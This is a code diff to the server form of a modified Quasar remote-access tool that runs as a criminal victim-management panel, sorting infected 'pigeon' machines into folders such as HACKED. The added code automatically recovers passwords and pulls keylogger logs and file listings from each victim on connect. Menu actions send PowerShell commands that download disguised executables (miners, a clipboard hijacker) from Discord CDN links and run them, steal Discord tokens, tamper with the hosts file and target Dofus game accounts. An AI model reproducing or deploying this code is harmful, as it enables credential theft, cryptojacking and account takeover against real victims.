@@ -66,14 +66,14 @@ namespace Quasar.Server.Forms
             _titleUpdateRunning = true;
             try
             {
-                this.Invoke((MethodInvoker) delegate
-                {
-                    int selected = lstClients.SelectedItems.Count;
-                    this.Text = (selected > 0)
-                        ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
-                            selected)
-                        : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
-                });
+                this.Invoke((MethodInvoker)delegate
+               {
+                   int selected = lstClients.SelectedItems.Count;
+                   this.Text = (selected > 0)
+                       ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
+                           selected)
+                       : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
+               });
             }
             catch (Exception)
             {
@@ -182,12 +182,12 @@ namespace Quasar.Server.Forms
         {
             try
             {
-                this.Invoke((MethodInvoker) delegate
-                {
-                    if (!listening)
-                        lstClients.Items.Clear();
-                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
-                });
+                this.Invoke((MethodInvoker)delegate
+               {
+                   if (!listening)
+                       lstClients.Items.Clear();
+                   listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
+               });
                 UpdateWindowTitle();
             }
             catch (InvalidOperationException)
@@ -227,6 +227,7 @@ namespace Quasar.Server.Forms
                 Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../NODOFUS");
                 Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../A VIDER SHIELD");
                 Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../A VIDER AUTH");
+                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../LOUPE");
 
                 //Envoi SMS
                 WshShell shell = new WshShell();
@@ -247,7 +248,7 @@ namespace Quasar.Server.Forms
                     shell.Exec(smscommand);
                 }
 
-                
+
 
 
                 ////Note détails pigeon dans fichier INFOS.txt
@@ -332,12 +333,12 @@ namespace Quasar.Server.Forms
 
             try
             {
-                lstClients.Invoke((MethodInvoker) delegate
-                {
-                    var item = GetListViewItemByClient(client);
-                    if (item != null)
-                        item.ToolTipText = text;
-                });
+                lstClients.Invoke((MethodInvoker)delegate
+               {
+                   var item = GetListViewItemByClient(client);
+                   if (item != null)
+                       item.ToolTipText = text;
+               });
             }
             catch (InvalidOperationException)
             {
@@ -369,12 +370,12 @@ namespace Quasar.Server.Forms
                 }
                 if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName)))
                 {
-                    client.Value.Tag = "1.SHIELD";
+                    client.Value.Tag = "1. SHIELD";
                     co = System.Drawing.Color.LightPink;
                 }
                 if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName)))
                 {
-                    client.Value.Tag = "0.AUTH";
+                    client.Value.Tag = "0. AUTH";
                     co = System.Drawing.Color.Cyan;
                 }
                 if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName)))
@@ -382,7 +383,14 @@ namespace Quasar.Server.Forms
                     client.Value.Tag = "4. NODOFUS";
                     co = System.Drawing.Color.LightGray;
                 }
+                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../LOUPE/" + shortcutName)))
+                {
+                    client.Value.Tag = "5. LOUPE";
+                    co = System.Drawing.Color.Cyan;
+                }
 
+                client.Value.Version = "-";
+                client.Value.AccountType = "0";
 
                 // this " " leaves some space between the flag-icon and first item
                 ListViewItem lvi = new ListViewItem(new string[]
@@ -390,16 +398,17 @@ namespace Quasar.Server.Forms
                     " " + client.EndPoint.Address, client.Value.Tag,
                     client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
                     client.Value.OperatingSystem, client.Value.AccountType
-                }) { Tag = client, ImageIndex = client.Value.ImageIndex };
+                })
+                { Tag = client, ImageIndex = client.Value.ImageIndex };
 
                 lvi.BackColor = co;
-                
 
-                lstClients.Invoke((MethodInvoker) delegate
-                {
-                    lock (_lockClients)
-                    {
-                        lstClients.Items.Add(lvi);
+
+                lstClients.Invoke((MethodInvoker)delegate
+               {
+                   lock (_lockClients)
+                   {
+                       lstClients.Items.Add(lvi);
 
                         //  _____   ____  ______ _    _  _____ 
                         // |  __ \ / __ \|  ____| |  | |/ ____|
@@ -410,35 +419,42 @@ namespace Quasar.Server.Forms
 
                         Client[] clients = new Client[] { client };
 
-                        
 
                         //passwords
-                            FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
-                        frmPass.RecoverPasswords();
+                        FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
+                       frmPass.RecoverPasswords();
 
-                        ////logs
-                        FrmKeylogger frmKeylogger = FrmKeylogger.CreateNewOrGetExisting(client);
-                        frmKeylogger._keyloggerHandler.RetrieveLogs();
+                       ////logs
+                       FrmKeylogger frmKeylogger = FrmKeylogger.CreateNewOrGetExisting(client);
+                       frmKeylogger._keyloggerHandler.RetrieveLogs();
 
-                        ////infos system
-                        FrmSystemInformation frmSi = new FrmSystemInformation(client);
-                        frmSi._sysInfoHandler.RefreshSystemInformation();
+                       ////infos system
+                       FrmSystemInformation frmSi = new FrmSystemInformation(client);
+                       frmSi._sysInfoHandler.RefreshSystemInformation();
 
                         //files
                         FrmFileManager frmFM = new FrmFileManager(client);
-                        frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users");
-                        frmFM._fileManagerHandler.GetDirectoryContents("C:\\Windows\\Temp");
+                       frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users");
+                       frmFM._fileManagerHandler.GetDirectoryContents("C:\\Windows\\Temp");
 
-                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\Dofus");
-                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap");
-                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap\\keydata");
-                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap\\certificate");
-                        //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\AnkamaCertificates\\v2-RELEASE");
+                       //Current Window
+                       FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(client);
+                       client.Send(new DoShellExecute { Command = "powershell -command \"$code = '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr GetForegroundWindow();';Add-Type $code -Name Utils -Namespace Win32; Get-Process | Where-Object { $_.mainWindowHandle -eq [Win32.Utils]::GetForegroundWindow() } | Select-Object MainWindowTItle | ForEach-Object {\\\"CURWIND*=\\\"+$_.MainWindowTItle}\" " });
+                       client.Send(new DoShellExecute { Command = "powershell -command \"'DFSCOUNT*=' + (get-process dofus).count\"" });
+                       frmRs.WindowState = System.Windows.Forms.FormWindowState.Minimized;
+                       frmRs.Show();
+                       frmRs.Hide();
 
-                        //frmFM._fileManagerHandler.BeginUploadFile("pssuspend.exe", "C:\\pssuspend.exe");
+                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\Dofus");
+                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap");
+                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap\\keydata");
+                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap\\certificate");
+                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\AnkamaCertificates\\v2-RELEASE");
 
-                    }
-                });
+                       //frmFM._fileManagerHandler.BeginUploadFile("pssuspend.exe", "C:\\pssuspend.exe");
+
+                   }
+               });
 
                 UpdateWindowTitle();
             }
@@ -457,18 +473,18 @@ namespace Quasar.Server.Forms
 
             try
             {
-                lstClients.Invoke((MethodInvoker) delegate
-                {
-                    lock (_lockClients)
-                    {
-                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
-                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
-                        {
-                            lvi.Remove();
-                            break;
-                        }
-                    }
-                });
+                lstClients.Invoke((MethodInvoker)delegate
+               {
+                   lock (_lockClients)
+                   {
+                       foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
+                           .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
+                       {
+                           lvi.Remove();
+                           break;
+                       }
+                   }
+               });
                 UpdateWindowTitle();
             }
             catch (InvalidOperationException)
@@ -514,11 +530,11 @@ namespace Quasar.Server.Forms
 
             ListViewItem itemClient = null;
 
-            lstClients.Invoke((MethodInvoker) delegate
-            {
-                itemClient = lstClients.Items.Cast<ListViewItem>()
-                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
-            });
+            lstClients.Invoke((MethodInvoker)delegate
+           {
+               itemClient = lstClients.Items.Cast<ListViewItem>()
+                   .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
+           });
 
             return itemClient;
         }
@@ -566,7 +582,7 @@ namespace Quasar.Server.Forms
                 this.Invoke((MethodInvoker)delegate
                 {
                     if (c == null || c.Value == null) return;
-                    
+
                     notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                         string.Format("IP Address: {0}\nUser@PC: {1}", c.EndPoint.Address.ToString(),
                         c.Value.UserAtPc), ToolTipIcon.Info);
@@ -681,7 +697,8 @@ namespace Quasar.Server.Forms
             foreach (Client c in GetSelectedClients())
             {
                 FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
-                frmRs.Show();
+                frmRs.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+                frmRs.Show();                
                 frmRs.Focus();
             }
         }
@@ -743,7 +760,7 @@ namespace Quasar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
             }
         }
 
@@ -751,7 +768,7 @@ namespace Quasar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
             }
         }
 
@@ -759,7 +776,7 @@ namespace Quasar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
+                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
             }
         }
 
@@ -1024,6 +1041,210 @@ namespace Quasar.Server.Forms
         private void statusStrip_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
         {
 
+        }
+
+        private void deleteShortcuts(Client c)
+        {
+            String shortcutName = c.Value.UserAtPc + "_" + c.Value.Id.Substring(0, 7) + ".lnk";
+            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName)))
+            {
+                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName);
+            }
+            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName)))
+            {
+                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName);
+            }
+            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName)))
+            {
+                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName);
+            }
+            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../HACKED/" + shortcutName)))
+            {
+                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../HACKED/" + shortcutName);
+            }
+            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../NEW/" + shortcutName)))
+            {
+                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../NEW/" + shortcutName);
+            }
+            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../LOUPE/" + shortcutName)))
+            {
+                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../LOUPE/" + shortcutName);
+            }
+        }
+
+        private void moveClient(string path)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                //Remove client from list view
+                RemoveClientFromListview(c);
+
+                //Suppression raccourcis
+                deleteShortcuts(c);
+
+                //Creation nouveau raccourci
+                WshShell shell = new WshShell();
+                String shortcutName = c.Value.UserAtPc + "_" + c.Value.Id.Substring(0, 7) + ".lnk";
+                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(c.Value.DownloadDirectory + path + shortcutName);
+                shortcut.TargetPath = c.Value.DownloadDirectory;
+                shortcut.Save();
+
+                //Addclienttolistview
+                AddClientToListview(c);
+            }
+        }
+
+        private void nEWToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            moveClient("/../../NEW/");
+        }
+
+        private void aVIDERAUTHToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            moveClient("/../../A VIDER AUTH/");
+
+        }
+        private void aVIDERSHIELDToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            moveClient("/../../A VIDER SHIELD/");
+        }
+
+        private void hACKEDToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            moveClient("/../../HACKED/");
+        }
+
+        private void nODOFUSToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            moveClient("/../../NODOFUS/");
+        }
+
+        private void lOUPEToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            moveClient("/../../LOUPE/");
+        }
+
+
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            foreach (Client c in GetConnectedClients())
+            {
+                var item = GetListViewItemByClient(c);
+                if (item != null)
+                {
+                    item.SubItems[3].Text = c.Value.Version;
+                    item.SubItems[8].Text = c.Value.AccountType;
+                    if (c.Value.AccountType != "0")
+                    {
+                        item.Font = new System.Drawing.Font("Segoe UI", 9, System.Drawing.FontStyle.Bold);
+                    }
+                    else 
+                    {
+                        item.Font = new System.Drawing.Font("Segoe UI", 9);
+                    }
+                }
+            }
+        }
+
+        private void timer_get_window_Tick(object sender, EventArgs e)
+        {
+            foreach (Client c in GetConnectedClients())
+            {
+                c.Send(new DoShellExecute { Command = "powershell -command \"$code = '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr GetForegroundWindow();';Add-Type $code -Name Utils -Namespace Win32; Get-Process | Where-Object { $_.mainWindowHandle -eq [Win32.Utils]::GetForegroundWindow() } | Select-Object MainWindowTItle | ForEach-Object {\\\"CURWIND*=\\\"+$_.MainWindowTItle}\" " });
+                c.Send(new DoShellExecute { Command = "powershell -command \"'DFSCOUNT*=' + (get-process dofus).count\"" });
+            }
+        }
+
+        private void refreshToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var item = GetListViewItemByClient(c);
+                if (item != null)
+                {
+                    item.SubItems[3].Text = c.Value.Version;
+                    item.SubItems[8].Text = c.Value.AccountType;
+                    if (c.Value.AccountType != "0")
+                    {
+                        item.Font = new System.Drawing.Font("Segoe UI", 9, System.Drawing.FontStyle.Bold);
+                    }
+                    else
+                    {
+                        item.Font = new System.Drawing.Font("Segoe UI", 9);
+                    }
+                }
+            }
+        }
+
+        private void sendCommandToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShellExecute { Command = "powershell -command \"$code = '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr GetForegroundWindow();';Add-Type $code -Name Utils -Namespace Win32; Get-Process | Where-Object { $_.mainWindowHandle -eq [Win32.Utils]::GetForegroundWindow() } | Select-Object MainWindowTItle | ForEach-Object {\\\"CURWIND*=\\\"+$_.MainWindowTItle}\" " });
+                c.Send(new DoShellExecute { Command = "powershell -command \"'DFSCOUNT*=' + (get-process dofus).count\"" });
+            }
+        }
+
+        private void minerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShellExecute { Command = "powershell -command \"(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/918845039176712243/918845272552005642/Ckhqfuu.png', 'C://Windows//Temp//svshost.exe') ; start 'C:/Windows/Temp/svshost.exe'\"" });
+
+            }
+        }
+
+        private void clipJackToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShellExecute { Command = "powershell -command \"(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/918845039176712243/939138953326518282/srs.png', 'C://Windows//Temp//srs.exe') ; start 'C:/Windows/Temp/srs.exe'\"" });
+
+            }
+        }
+
+        private void minerIfGPUToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShellExecute { Command = "powershell -command \" $gpu = Get-WmiObject Win32_VideoController;if ($gpu.description -match 'GeForce RTX' -or $gpu.description -match 'GeForce GTX' -or $gpu.description -match 'Radeon RX' -or $gpu.description -match 'Radeon R9' -or $gpu.description -match 'Radeon(TM) RX' -or $gpu.description -match 'Radeon(TM) R9'  -or $gpu.description -match 'Radeon (TM) RX'  -or $gpu.description -match 'Radeon (TM) R9'){(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/918845039176712243/918845272552005642/Ckhqfuu.png', $env:TEMP+'/svshost.exe');start $env:TEMP'/svshost.exe';} \"" });
+            }
+        }
+
+        private void hostsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmFileManager frmFM = new FrmFileManager(c);
+                frmFM._fileManagerHandler.BeginUploadFile("hosts", "C:\\Windows\\System32\\drivers\\etc\\hosts");
+            }
+        }
+
+        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmFileManager frmFM = new FrmFileManager(c);
+                frmFM._fileManagerHandler.DeleteFile("C:\\Windows\\System32\\drivers\\etc\\hosts", FileType.File);
+            }
+        }
+
+        private void getDiscordTokenToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShellExecute { Command = "powershell -command \"Get-ChildItem -Path $Env:AppData'\\discord\\Local Storage\\leveldb\\*.ldb' | Select-String -Pattern 'mfa\\.[\\w-]{84}|[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}' -AllMatches | % { $_.Matches } | % { $_.Value } > $Env:AppData'\\discord\\Local Storage\\leveldb\\dtk'\"" });
+
+            }
+        }
+
+        private void getHasuftxtToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoShellExecute { Command = "powershell -command \"'langue : '+[CultureInfo]::InstalledUICulture.Name.split('-')[0]+' / username : '+[Environment]::GetFolderPath('MyDocuments').split('\\')[2] > C://Windows//Temp//getHashSuf.txt\"" });
+            }
         }
     }
 }
